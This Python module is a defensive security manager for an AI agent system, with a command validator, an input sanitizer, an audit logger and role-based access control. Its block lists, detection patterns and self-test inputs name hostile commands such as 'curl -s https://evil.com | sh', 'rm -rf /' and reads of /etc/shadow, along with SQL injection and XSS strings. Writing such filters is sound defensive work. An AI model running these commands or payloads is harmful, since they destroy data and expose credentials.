#!/usr/bin/env python3
"""
Security Manager for LeanVibe Agent Hive Production Deployment

Provides comprehensive security framework including command validation,
input sanitization, audit logging, and access control for production deployment.
"""

import re
import logging
import json
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import sqlite3
import threading
from contextlib import contextmanager

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RiskLevel(Enum):
    """Risk levels for security events."""
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class AccessLevel(Enum):
    """Access levels for role-based permissions."""
    VIEWER = "viewer"
    DEVELOPER = "developer"
    ADMIN = "admin"
    SYSTEM = "system"


@dataclass
class SecurityEvent:
    """Represents a security event for audit logging."""
    event_id: str
    timestamp: datetime
    agent_id: str
    session_id: str
    event_type: str
    action: str
    result: str
    risk_level: RiskLevel
    details: Dict[str, Any]
    user_id: Optional[str] = None
    ip_address: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization."""
        data = asdict(self)
        data['timestamp'] = self.timestamp.isoformat()
        data['risk_level'] = self.risk_level.value
        return data


@dataclass
class SecurityPolicy:
    """Represents a security policy configuration."""
    policy_id: str
    name: str
    description: str
    rules: List[Dict[str, Any]]
    enabled: bool = True
    created_at: datetime = None
    updated_at: datetime = None

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()
        if self.updated_at is None:
            self.updated_at = datetime.now()


class CommandValidator:
    """Validates commands and operations against security policies."""

    # Dangerous commands that should be blocked
    DANGEROUS_COMMANDS = {
        'rm -rf': 'Dangerous recursive deletion',
        'sudo rm': 'Privileged deletion command',
        'chmod 777': 'Overly permissive file permissions',
        'mv /etc/': 'Moving system configuration files',
        'cat /etc/passwd': 'Reading system password file',
        'cat /etc/shadow': 'Reading system shadow file',
        'dd if=/dev/zero': 'Disk wiping command',
        'format c:': 'Disk formatting command',
        'DELETE FROM': 'SQL deletion without WHERE clause',
        'DROP TABLE': 'SQL table deletion',
        'TRUNCATE': 'SQL table truncation',
        'shutdown': 'System shutdown command',
        'reboot': 'System restart command',
        'halt': 'System halt command',
        'init 0': 'System shutdown via init',
        'kill -9': 'Force kill processes',
        'pkill': 'Kill processes by name',
        'killall': 'Kill all processes',
        'mount': 'Mount filesystem',
        'umount': 'Unmount filesystem',
        'fdisk': 'Disk partitioning',
        'mkfs': 'Create filesystem',
        'fsck': 'Filesystem check',
        'crontab -r': 'Delete all cron jobs',
        'history -c': 'Clear command history',
        'export PATH=': 'PATH manipulation',
        'alias rm=': 'Alias dangerous commands',
        'eval': 'Dynamic code execution',
        'exec': 'Process replacement',
        'source /dev/stdin': 'Execute stdin input',
        'curl | sh': 'Download and execute',
        'wget | sh': 'Download and execute',
        'python -c "import os; os.system': 'Python system execution',
        'subprocess.call': 'Python subprocess execution',
        'os.system': 'Python OS system call',
        'shell=True': 'Shell execution in subprocess'
    }

    # Suspicious patterns that should be flagged
    SUSPICIOUS_PATTERNS = {
        r'[;&|`]': 'Command chaining or injection',
        r'\$\(.*\)': 'Command substitution',
        r'`.*`': 'Backtick command execution',
        r'>\s*/dev/null\s*2>&1': 'Output redirection (hiding errors)',
        r'nohup.*&': 'Background process execution',
        r'base64.*decode': 'Base64 decoding (potential obfuscation)',
        r'echo.*\|.*base64': 'Base64 encoding/decoding pipeline',
        r'curl.*-s.*\|': 'Silent download with pipe',
        r'wget.*-q.*\|': 'Quiet download with pipe',
        r'/tmp/[a-zA-Z0-9]{8,}': 'Temporary file with random name',
        r'\.\.\/': 'Directory traversal',
        r'%2e%2e%2f': 'URL-encoded directory traversal',
        r'<script': 'Script injection',
        r'javascript:': 'JavaScript execution',
        r'vbscript:': 'VBScript execution',
        r'data:text/html': 'Data URI with HTML',
        r'eval\s*\(': 'Dynamic evaluation',
        r'exec\s*\(': 'Dynamic execution',
        r'import\s+subprocess': 'Subprocess import',
        r'from\s+subprocess\s+import': 'Subprocess import',
        r'__import__': 'Dynamic import',
        r'getattr\s*\(': 'Dynamic attribute access',
        r'setattr\s*\(': 'Dynamic attribute setting',
        r'hasattr\s*\(': 'Dynamic attribute checking'
    }

    # Safe commands that are always allowed
    SAFE_COMMANDS = {
        'ls', 'cat', 'head', 'tail', 'grep', 'find', 'wc', 'sort', 'uniq',
        'echo', 'printf', 'date', 'whoami', 'pwd', 'which', 'whereis',
        'man', 'info', 'help', 'history', 'alias', 'type', 'command',
        'cd', 'mkdir', 'touch', 'cp', 'mv', 'ln', 'chmod', 'chown',
        'tar', 'gzip', 'gunzip', 'zip', 'unzip', 'git', 'svn', 'hg',
        'python', 'pip', 'npm', 'node', 'java', 'javac', 'gcc', 'make',
        'docker', 'kubectl', 'terraform', 'ansible', 'vim', 'nano', 'emacs'
    }

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.custom_rules = []
        self.whitelist = set(self.SAFE_COMMANDS)
        self.blacklist = set(self.DANGEROUS_COMMANDS.keys())
        self.enabled = self.config.get('enabled', True)

    def validate_command(self, command: str, context: Dict[str, Any] = None) -> Tuple[bool, str, RiskLevel]:
        """
        Validate a command against security policies.

        Returns:
            Tuple of (is_valid, reason, risk_level)
        """
        if not self.enabled:
            return True, "Security validation disabled", RiskLevel.LOW

        if not command or not command.strip():
            return False, "Empty command", RiskLevel.LOW

        command = command.strip()

        # Check for dangerous commands
        for dangerous_cmd, reason in self.DANGEROUS_COMMANDS.items():
            if dangerous_cmd.lower() in command.lower():
                return False, f"Dangerous command detected: {reason}", RiskLevel.CRITICAL

        # Check for suspicious patterns
        for pattern, reason in self.SUSPICIOUS_PATTERNS.items():
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"Suspicious pattern detected: {reason}", RiskLevel.HIGH

        # Check custom rules
        for rule in self.custom_rules:
            if not self._evaluate_rule(rule, command, context):
                return False, f"Custom rule violation: {rule['name']}", RiskLevel.MEDIUM

        # Extract base command
        base_cmd = command.split()[0] if command.split() else ""

        # Check if command is explicitly safe
        if base_cmd in self.whitelist:
            return True, "Safe command", RiskLevel.LOW

        # Check if command is explicitly dangerous
        if base_cmd in self.blacklist:
            return False, "Blacklisted command", RiskLevel.HIGH

        # Check for file system operations in sensitive directories
        sensitive_dirs = ['/etc', '/usr/bin', '/usr/sbin', '/bin', '/sbin', '/root', '/home']
        for dir_path in sensitive_dirs:
            if dir_path in command:
                return False, f"Operation in sensitive directory: {dir_path}", RiskLevel.HIGH

        # Default to medium risk for unknown commands
        return True, "Unknown command - proceed with caution", RiskLevel.MEDIUM

    def _evaluate_rule(self, rule: Dict[str, Any], command: str, context: Dict[str, Any]) -> bool:
        """Evaluate a custom security rule."""
        rule_type = rule.get('type', 'regex')

        if rule_type == 'regex':
            pattern = rule.get('pattern', '')
            return not re.search(pattern, command, re.IGNORECASE)
        elif rule_type == 'function':
            func = rule.get('function')
            if callable(func):
                return func(command, context)

        return True

    def add_custom_rule(self, rule: Dict[str, Any]):
        """Add a custom security rule."""
        self.custom_rules.append(rule)

    def add_to_whitelist(self, command: str):
        """Add a command to the whitelist."""
        self.whitelist.add(command)

    def add_to_blacklist(self, command: str):
        """Add a command to the blacklist."""
        self.blacklist.add(command)


class InputSanitizer:
    """Sanitizes user input to prevent injection attacks."""

    # Dangerous characters and patterns
    DANGEROUS_CHARS = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#x27;',
        '&': '&amp;',
        '/': '&#x2F;',
        '\\': '&#x5C;'
    }

    SQL_INJECTION_PATTERNS = [
        r"('|(\\')|(;)|(\\;)|(--|/\\*|\\*/)|(\bunion\b)|(\bselect\b)|(\binsert\b)|(\bdelete\b)|(\bupdate\b)|(\bcreate\b)|(\bdrop\b)|(\balter\b)|(\bexec\b)|(\bexecute\b)|(\bsp_\b))",
        r"(union)|(select)|(insert)|(delete)|(update)|(create)|(drop)|(alter)|(exec)|(execute)|(sp_)",
        r"(script)|(javascript)|(vbscript)|(onload)|(onerror)|(onclick)"
    ]

    XSS_PATTERNS = [
        r"<script[^>]*>.*?</script>",
        r"javascript:",
        r"on\w+=",
        r"<iframe[^>]*>",
        r"<object[^>]*>",
        r"<embed[^>]*>",
        r"<link[^>]*>",
        r"<meta[^>]*>",
        r"<style[^>]*>.*?</style>",
        r"expression\s*\(",
        r"@import",
        r"vbscript:",
        r"data:text/html"
    ]

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.enabled = self.config.get('enabled', True)
        self.strict_mode = self.config.get('strict_mode', False)

    def sanitize_input(self, input_data: str, input_type: str = 'text') -> str:
        """
        Sanitize input data to prevent injection attacks.

        Args:
            input_data: The input string to sanitize
            input_type: Type of input (text, html, command, sql, etc.)

        Returns:
            Sanitized input string
        """
        if not self.enabled:
            return input_data

        if not input_data:
            return input_data

        # Basic sanitization for all input types
        sanitized = self._basic_sanitize(input_data)

        # Type-specific sanitization
        if input_type == 'html':
            sanitized = self._sanitize_html(sanitized)
        elif input_type == 'command':
            sanitized = self._sanitize_command(sanitized)
        elif input_type == 'sql':
            sanitized = self._sanitize_sql(sanitized)
        elif input_type == 'path':
            sanitized = self._sanitize_path(sanitized)

        return sanitized

    def _basic_sanitize(self, input_data: str) -> str:
        """Basic sanitization for all input types."""
        # Remove or escape dangerous characters
        sanitized = input_data

        for char, replacement in self.DANGEROUS_CHARS.items():
            sanitized = sanitized.replace(char, replacement)

        # Remove null bytes
        sanitized = sanitized.replace('\x00', '')

        # Normalize whitespace
        sanitized = ' '.join(sanitized.split())

        return sanitized

    def _sanitize_html(self, input_data: str) -> str:
        """Sanitize HTML input to prevent XSS."""
        sanitized = input_data

        # Remove dangerous patterns
        for pattern in self.XSS_PATTERNS:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)

        # Remove script tags and their content
        sanitized = re.sub(r'<script[^>]*>.*?</script>', '', sanitized, flags=re.IGNORECASE | re.DOTALL)

        return sanitized

    def _sanitize_command(self, input_data: str) -> str:
        """Sanitize command input to prevent command injection."""
        sanitized = input_data

        # Remove dangerous command patterns
        dangerous_patterns = [
            r'[;&|`]',  # Command separators
            r'\$\(.*\)',  # Command substitution
            r'`.*`',  # Backtick execution
            r'>\s*/dev/null',  # Output redirection
            r'2>&1',  # Error redirection
            r'<<.*',  # Here document
            r'>>.*',  # Append redirection
        ]

        for pattern in dangerous_patterns:
            sanitized = re.sub(pattern, '', sanitized)

        return sanitized

    def _sanitize_sql(self, input_data: str) -> str:
        """Sanitize SQL input to prevent SQL injection."""
        sanitized = input_data

        # Remove dangerous SQL patterns
        for pattern in self.SQL_INJECTION_PATTERNS:
            sanitized = re.sub(pattern, '', sanitized, flags=re.IGNORECASE)

        # Escape single quotes
        sanitized = sanitized.replace("'", "''")

        return sanitized

    def _sanitize_path(self, input_data: str) -> str:
        """Sanitize file path input to prevent directory traversal."""
        sanitized = input_data

        # Remove directory traversal patterns
        sanitized = re.sub(r'\.\./', '', sanitized)
        sanitized = re.sub(r'\.\.\\', '', sanitized)
        sanitized = re.sub(r'%2e%2e%2f', '', sanitized, flags=re.IGNORECASE)
        sanitized = re.sub(r'%2e%2e%5c', '', sanitized, flags=re.IGNORECASE)

        # Normalize path separators
        sanitized = sanitized.replace('\\', '/')

        # Remove multiple slashes
        sanitized = re.sub(r'/+', '/', sanitized)

        return sanitized

    def is_safe_input(self, input_data: str, input_type: str = 'text') -> Tuple[bool, str]:
        """
        Check if input is safe without sanitizing.

        Returns:
            Tuple of (is_safe, reason)
        """
        if not input_data:
            return True, "Empty input"

        # Check for dangerous patterns based on input type
        if input_type == 'html':
            for pattern in self.XSS_PATTERNS:
                if re.search(pattern, input_data, re.IGNORECASE):
                    return False, f"XSS pattern detected: {pattern}"

        elif input_type == 'sql':
            for pattern in self.SQL_INJECTION_PATTERNS:
                if re.search(pattern, input_data, re.IGNORECASE):
                    return False, f"SQL injection pattern detected: {pattern}"

        elif input_type == 'command':
            dangerous_patterns = [r'[;&|`]', r'\$\(.*\)', r'`.*`']
            for pattern in dangerous_patterns:
                if re.search(pattern, input_data):
                    return False, f"Command injection pattern detected: {pattern}"

        elif input_type == 'path':
            if re.search(r'\.\./', input_data) or re.search(r'\.\.\\', input_data):
                return False, "Directory traversal pattern detected"

        return True, "Input appears safe"


class AuditLogger:
    """Handles audit logging for security events."""

    def __init__(self, db_path: str = "security_audit.db"):
        self.db_path = db_path
        self.lock = threading.Lock()
        self._init_database()

    def _init_database(self):
        """Initialize the audit database."""
        with self._get_db_connection() as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS security_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    event_id TEXT UNIQUE NOT NULL,
                    timestamp TEXT NOT NULL,
                    agent_id TEXT NOT NULL,
                    session_id TEXT NOT NULL,
                    event_type TEXT NOT NULL,
                    action TEXT NOT NULL,
                    result TEXT NOT NULL,
                    risk_level TEXT NOT NULL,
                    details TEXT NOT NULL,
                    user_id TEXT,
                    ip_address TEXT
                )
            ''')

            conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_timestamp ON security_events(timestamp)
            ''')

            conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_agent_id ON security_events(agent_id)
            ''')

            conn.execute('''
                CREATE INDEX IF NOT EXISTS idx_risk_level ON security_events(risk_level)
            ''')

    @contextmanager
    def _get_db_connection(self):
        """Get a database connection with proper locking."""
        with self.lock:
            conn = sqlite3.connect(self.db_path)
            try:
                yield conn
                conn.commit()
            except Exception:
                conn.rollback()
                raise
            finally:
                conn.close()

    def log_security_event(self, event: SecurityEvent):
        """Log a security event to the audit database."""
        with self._get_db_connection() as conn:
            conn.execute('''
                INSERT OR REPLACE INTO security_events (
                    event_id, timestamp, agent_id, session_id, event_type,
                    action, result, risk_level, details, user_id, ip_address
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                event.event_id,
                event.timestamp.isoformat(),
                event.agent_id,
                event.session_id,
                event.event_type,
                event.action,
                event.result,
                event.risk_level.value,
                json.dumps(event.details),
                event.user_id,
                event.ip_address
            ))

    def get_security_events(self,
                           start_time: datetime = None,
                           end_time: datetime = None,
                           agent_id: str = None,
                           risk_level: RiskLevel = None,
                           limit: int = 100) -> List[SecurityEvent]:
        """Retrieve security events from the audit log."""

        query = "SELECT * FROM security_events WHERE 1=1"
        params = []

        if start_time:
            query += " AND timestamp >= ?"
            params.append(start_time.isoformat())

        if end_time:
            query += " AND timestamp <= ?"
            params.append(end_time.isoformat())

        if agent_id:
            query += " AND agent_id = ?"
            params.append(agent_id)

        if risk_level:
            query += " AND risk_level = ?"
            params.append(risk_level.value)

        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)

        with self._get_db_connection() as conn:
            cursor = conn.execute(query, params)
            rows = cursor.fetchall()

        events = []
        for row in rows:
            event = SecurityEvent(
                event_id=row[1],
                timestamp=datetime.fromisoformat(row[2]),
                agent_id=row[3],
                session_id=row[4],
                event_type=row[5],
                action=row[6],
                result=row[7],
                risk_level=RiskLevel(row[8]),
                details=json.loads(row[9]),
                user_id=row[10],
                ip_address=row[11]
            )
            events.append(event)

        return events

    def get_security_summary(self, hours: int = 24) -> Dict[str, Any]:
        """Get security summary for the specified time period."""
        start_time = datetime.now() - timedelta(hours=hours)

        with self._get_db_connection() as conn:
            # Get total events
            cursor = conn.execute(
                "SELECT COUNT(*) FROM security_events WHERE timestamp >= ?",
                (start_time.isoformat(),)
            )
            total_events = cursor.fetchone()[0]

            # Get events by risk level
            cursor = conn.execute('''
                SELECT risk_level, COUNT(*)
                FROM security_events
                WHERE timestamp >= ?
                GROUP BY risk_level
            ''', (start_time.isoformat(),))
            risk_summary = dict(cursor.fetchall())

            # Get top agents by event count
            cursor = conn.execute('''
                SELECT agent_id, COUNT(*)
                FROM security_events
                WHERE timestamp >= ?
                GROUP BY agent_id
                ORDER BY COUNT(*) DESC
                LIMIT 10
            ''', (start_time.isoformat(),))
            top_agents = dict(cursor.fetchall())

            # Get event types
            cursor = conn.execute('''
                SELECT event_type, COUNT(*)
                FROM security_events
                WHERE timestamp >= ?
                GROUP BY event_type
            ''', (start_time.isoformat(),))
            event_types = dict(cursor.fetchall())

        return {
            'period_hours': hours,
            'total_events': total_events,
            'risk_summary': risk_summary,
            'top_agents': top_agents,
            'event_types': event_types,
            'generated_at': datetime.now().isoformat()
        }


class AccessControlManager:
    """Manages role-based access control."""

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.permissions = self._init_permissions()
        self.user_roles = {}
        self.session_permissions = {}

    def _init_permissions(self) -> Dict[AccessLevel, Set[str]]:
        """Initialize default permissions for each access level."""
        return {
            AccessLevel.VIEWER: {
                'read_status', 'read_logs', 'read_metrics'
            },
            AccessLevel.DEVELOPER: {
                'read_status', 'read_logs', 'read_metrics',
                'execute_commands', 'spawn_agents', 'modify_configs'
            },
            AccessLevel.ADMIN: {
                'read_status', 'read_logs', 'read_metrics',
                'execute_commands', 'spawn_agents', 'modify_configs',
                'manage_users', 'manage_security', 'system_admin'
            },
            AccessLevel.SYSTEM: {
                'read_status', 'read_logs', 'read_metrics',
                'execute_commands', 'spawn_agents', 'modify_configs',
                'manage_users', 'manage_security', 'system_admin',
                'internal_operations', 'bypass_security'
            }
        }

    def assign_role(self, user_id: str, role: AccessLevel):
        """Assign a role to a user."""
        self.user_roles[user_id] = role

    def check_permission(self, user_id: str, permission: str, session_id: str = None) -> bool:
        """Check if a user has a specific permission."""
        # Check session-specific permissions first
        if session_id and session_id in self.session_permissions:
            if permission in self.session_permissions[session_id]:
                return True

        # Check user role permissions
        user_role = self.user_roles.get(user_id, AccessLevel.VIEWER)
        return permission in self.permissions.get(user_role, set())

    def grant_session_permission(self, session_id: str, permission: str):
        """Grant a temporary permission for a session."""
        if session_id not in self.session_permissions:
            self.session_permissions[session_id] = set()
        self.session_permissions[session_id].add(permission)

    def revoke_session_permission(self, session_id: str, permission: str):
        """Revoke a temporary permission for a session."""
        if session_id in self.session_permissions:
            self.session_permissions[session_id].discard(permission)

    def get_user_permissions(self, user_id: str) -> Set[str]:
        """Get all permissions for a user."""
        user_role = self.user_roles.get(user_id, AccessLevel.VIEWER)
        return self.permissions.get(user_role, set())


class SecurityManager:
    """Main security manager that coordinates all security components."""

    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        self.command_validator = CommandValidator(self.config.get('command_validator', {}))
        self.input_sanitizer = InputSanitizer(self.config.get('input_sanitizer', {}))
        self.audit_logger = AuditLogger(self.config.get('audit_db_path', 'security_audit.db'))
        self.access_control = AccessControlManager(self.config.get('access_control', {}))
        self.enabled = self.config.get('enabled', True)

    def validate_operation(self,
                          operation: str,
                          agent_id: str,
                          session_id: str,
                          user_id: str = None,
                          context: Dict[str, Any] = None) -> Tuple[bool, str, RiskLevel]:
        """
        Validate an operation against all security policies.

        Returns:
            Tuple of (is_valid, reason, risk_level)
        """
        if not self.enabled:
            return True, "Security disabled", RiskLevel.LOW

        context = context or {}

        # Check access permissions
        if user_id:
            required_permission = self._get_required_permission(operation)
            if not self.access_control.check_permission(user_id, required_permission, session_id):
                self._log_security_event(
                    agent_id=agent_id,
                    session_id=session_id,
                    event_type="permission_denied",
                    action=operation,
                    result="denied",
                    risk_level=RiskLevel.MEDIUM,
                    details={"user_id": user_id, "required_permission": required_permission}
                )
                return False, f"Permission denied: {required_permission}", RiskLevel.MEDIUM

        # Validate command
        is_valid, reason, risk_level = self.command_validator.validate_command(operation, context)

        # Log the validation result
        self._log_security_event(
            agent_id=agent_id,
            session_id=session_id,
            event_type="command_validation",
            action=operation,
            result="allowed" if is_valid else "blocked",
            risk_level=risk_level,
            details={"reason": reason, "context": context}
        )

        return is_valid, reason, risk_level

    def sanitize_input(self, input_data: str, input_type: str = 'text') -> str:
        """Sanitize input data."""
        return self.input_sanitizer.sanitize_input(input_data, input_type)

    def is_safe_input(self, input_data: str, input_type: str = 'text') -> Tuple[bool, str]:
        """Check if input is safe."""
        return self.input_sanitizer.is_safe_input(input_data, input_type)

    def _get_required_permission(self, operation: str) -> str:
        """Get the required permission for an operation."""
        # Map operations to required permissions
        permission_map = {
            'execute_command': 'execute_commands',
            'spawn_agent': 'spawn_agents',
            'modify_config': 'modify_configs',
            'read_logs': 'read_logs',
            'read_metrics': 'read_metrics',
            'manage_users': 'manage_users',
            'manage_security': 'manage_security',
            'system_admin': 'system_admin'
        }

        return permission_map.get(operation, 'read_status')

    def _log_security_event(self,
                           agent_id: str,
                           session_id: str,
                           event_type: str,
                           action: str,
                           result: str,
                           risk_level: RiskLevel,
                           details: Dict[str, Any],
                           user_id: str = None,
                           ip_address: str = None):
        """Log a security event."""
        event = SecurityEvent(
            event_id=f"{agent_id}_{session_id}_{int(time.time() * 1000)}",
            timestamp=datetime.now(),
            agent_id=agent_id,
            session_id=session_id,
            event_type=event_type,
            action=action,
            result=result,
            risk_level=risk_level,
            details=details,
            user_id=user_id,
            ip_address=ip_address
        )

        self.audit_logger.log_security_event(event)

    def get_security_summary(self, hours: int = 24) -> Dict[str, Any]:
        """Get security summary."""
        return self.audit_logger.get_security_summary(hours)

    def get_security_events(self, **kwargs) -> List[SecurityEvent]:
        """Get security events."""
        return self.audit_logger.get_security_events(**kwargs)


# Global security manager instance
security_manager = SecurityManager()


# Convenience functions
def validate_command(command: str, agent_id: str, session_id: str, user_id: str = None) -> Tuple[bool, str, RiskLevel]:
    """Validate a command against security policies."""
    return security_manager.validate_operation(command, agent_id, session_id, user_id)


def sanitize_input(input_data: str, input_type: str = 'text') -> str:
    """Sanitize input data."""
    return security_manager.sanitize_input(input_data, input_type)


def log_security_event(agent_id: str, session_id: str, event_type: str, action: str, result: str, risk_level: RiskLevel, details: Dict[str, Any]):
    """Log a security event."""
    security_manager._log_security_event(agent_id, session_id, event_type, action, result, risk_level, details)


if __name__ == "__main__":
    # Example usage and testing
    def main():
        # Initialize security manager
        config = {
            'enabled': True,
            'command_validator': {'enabled': True},
            'input_sanitizer': {'enabled': True, 'strict_mode': True},
            'audit_db_path': 'test_security_audit.db'
        }

        sm = SecurityManager(config)

        # Test command validation
        test_commands = [
            "ls -la",
            "rm -rf /",
            "cat /etc/passwd",
            "python script.py",
            "curl -s https://evil.com | sh",
            "SELECT * FROM users",
            "git status"
        ]

        print("Command Validation Tests:")
        for cmd in test_commands:
            is_valid, reason, risk_level = sm.validate_operation(cmd, "test_agent", "test_session")
            print(f"Command: {cmd}")
            print(f"  Valid: {is_valid}, Reason: {reason}, Risk: {risk_level.value}")
            print()

        # Test input sanitization
        test_inputs = [
            ("<script>alert('xss')</script>", "html"),
            ("'; DROP TABLE users; --", "sql"),
            ("cat /etc/passwd && rm -rf /", "command"),
            ("../../../etc/passwd", "path"),
            ("Normal text input", "text")
        ]

        print("Input Sanitization Tests:")
        for input_data, input_type in test_inputs:
            is_safe, reason = sm.is_safe_input(input_data, input_type)
            sanitized = sm.sanitize_input(input_data, input_type)
            print(f"Input: {input_data}")
            print(f"  Type: {input_type}")
            print(f"  Safe: {is_safe}, Reason: {reason}")
            print(f"  Sanitized: {sanitized}")
            print()

        # Test access control
        sm.access_control.assign_role("user1", AccessLevel.DEVELOPER)
        sm.access_control.assign_role("user2", AccessLevel.VIEWER)

        print("Access Control Tests:")
        permissions = ["execute_commands", "manage_users", "read_logs"]
        for user in ["user1", "user2"]:
            print(f"User: {user}")
            for perm in permissions:
                has_perm = sm.access_control.check_permission(user, perm)
                print(f"  {perm}: {has_perm}")
            print()

        # Get security summary
        print("Security Summary:")
        summary = sm.get_security_summary(hours=1)
        print(json.dumps(summary, indent=2))

    main()
